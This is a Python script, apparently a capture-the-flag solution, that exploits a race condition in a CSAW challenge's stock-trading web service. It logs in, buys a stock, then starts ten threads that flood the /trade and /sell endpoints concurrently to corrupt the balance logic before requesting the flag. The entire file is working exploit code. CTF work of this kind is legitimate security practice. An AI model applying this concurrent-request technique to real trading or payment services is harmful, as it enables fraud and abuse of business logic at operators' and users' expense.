import requests
import threading
import time
import uuid

BASE = "http://android-dropper.csaw.io:4657"
KEY = "race_" + uuid.uuid4().hex[:8]

def post(path, data):
    try:
        r = requests.post(BASE + path, data=data, timeout=5)
        print(path, r.text, flush=True)
        return r.text
    except Exception as e:
        print("ERR", path, e, flush=True)
        return ""

def worker_trade(n):
    for _ in range(n):
        post("/trade", {"key": KEY, "stock": "GOOBER", "stock1": "BURPSHARKHAT"})

def worker_sell(n):
    for _ in range(n):
        post("/sell", {"key": KEY, "stock": "BURPSHARKHAT"})

print("KEY", KEY, flush=True)
post("/login", {"key": KEY})
post("/buy", {"key": KEY, "stock": "GOOBER"})
time.sleep(1)

ts = []
for _ in range(5):
    ts.append(threading.Thread(target=worker_trade, args=(20,)))
    ts.append(threading.Thread(target=worker_sell, args=(20,)))

for t in ts:
    t.start()
for t in ts:
    t.join()

time.sleep(3)
print(post("/login", {"key": KEY}), flush=True)
print(post("/flag", {"key": KEY}), flush=True)
end_of_edit
